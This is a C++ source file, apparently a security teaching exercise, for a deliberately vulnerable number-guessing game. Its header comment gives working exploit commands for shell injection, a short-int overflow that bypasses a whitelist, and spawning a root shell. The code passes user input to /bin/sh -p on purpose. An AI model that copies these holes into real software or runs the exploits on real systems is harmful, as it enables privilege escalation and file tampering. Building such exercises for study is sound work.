
/*
Purposefully exploitable code

Authors: GW and SE

Game: Guess a random number. Your score is determined by the number
of times you were consecutively within 35 steps of the random numbers generated.

Usage:
./guessinggame Username


Vulnerabilities:
- Password is required to run the game.
    (Exploit: can be retrieved using strings ./guessinggame)
- Shell injection due to poor mediation
    Exploit: Craft the input to execute specific commands. We can put any name and whatever
    highscore desired into the file that stores the highscores. Execute the following command:
    ./guessinggame " \"); echo \"Johnny \t Score: 99999\" | cat - /home/username/highscores.txt > \
    temp && mv -f temp /home/username/highscores.txt; $(printf %65397s) "
    ('\' at the end of first line is only necessary if the command contains \n char at that posiiton)

- Integer overflow to get past whitelist check
    The number 65397 from the command line needs to be adjusted in a strategic way for this to work:
        Crafting the input carefully, using a combination of commands and the command $(printf %65397s), 
        we can make the length of the argument into a special number. The special number will overflow 
        in a way that lets our input get past the conditional check. Since we store the length in a 
        variable of type “short int”, if we can have the length of our argument be the limit of 
        short int multiplied by 2 and then add 1 (so (32767*2)+1) then the int would actually equal 
        0. In our program, we check if the length is zero, so the attacker would need to choose an 
        int greater than 0 but less than the index of the first illegal character where an illegal 
        character is a character not in the whitelist.

- Privilege escalation (spawn root shell) 
    Exploit:
     ./guessinggame " \"); echo \"Sammy \t Score: 99999\" | /bin/sh; $(printf %65440) “


*/

#include <iostream>
#include <unistd.h>
#include <string.h>
#include <vector>

using namespace std;

void saveScore(long int score, string name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "(echo \"Name: %s \t Score: %ld\n\" | cat - /home/username/highscores.txt ) > /fakeroot/temp && mv temp /home/username/highscores.txt", name.c_str(), score);
    // https://www.cplusplus.com/forum/unices/68205/
    vector<char*> args;
    args.push_back("/bin/sh");
    args.push_back("-p");
    args.push_back("-c");
    args.push_back(cmd);
    args.push_back("\0");
    execv(args[0], &args[0]);
}

int main(int argc, char *argv[]) {
    string password;
    printf("You need a password to play this game. What is it?\n");
    std::cin >> password;

    if (password != PASSWORD) {
        printf("Wrong password! Bye.\n");
        return 0;
    }

	int randomnum = rand() % 100;
	short int userguess;

	// Have a whitelist so that the user cannot put weird commands in the input such as using 
    // bash metacharacters
    char whitelist[] = {
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
            'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'x',
            '.', ',', ' ', '!', '?', '0', '1', '2', '3', '4', '5', '6', '7',
            '8', '9' };

	short int lengthOfName = (string (argv[1])).length();

	if(lengthOfName <= 0 ) {
		// Poor attempt to prevent integer overflow
		printf("Your name is too long. \n");
		return -1;
	}

	bool found_char = 0;
	

    for (int i = 0; i < lengthOfName; i++) {
        if (!strchr(whitelist, argv[1][i])) {
            found_char = 1;
        }
    }

    if (found_char) {
    	printf("You must put your name! Letters, numbers, and special characters: '.', ',', ' ', '!', '?' only\n");
    	return -1;
    }

	// Start game
    bool roundwon = 1;
    long int score;
   	while (roundwon) {
		printf("Please enter a number between 0 and 100. You get another round if you're within 35 numbers.\n");
		std::cin >> userguess;
		if ((userguess - randomnum) > 35) {
			printf("You won. You get another round with a new random number.\n");
			int randomnum = rand() % 100;
			score ++;
		}
		else {
			printf("You lose. Game over. Writing score = %ld for %s \n into high scores database.\n", score, argv[1]);
			saveScore(score, argv[1]);
		}
	}
}



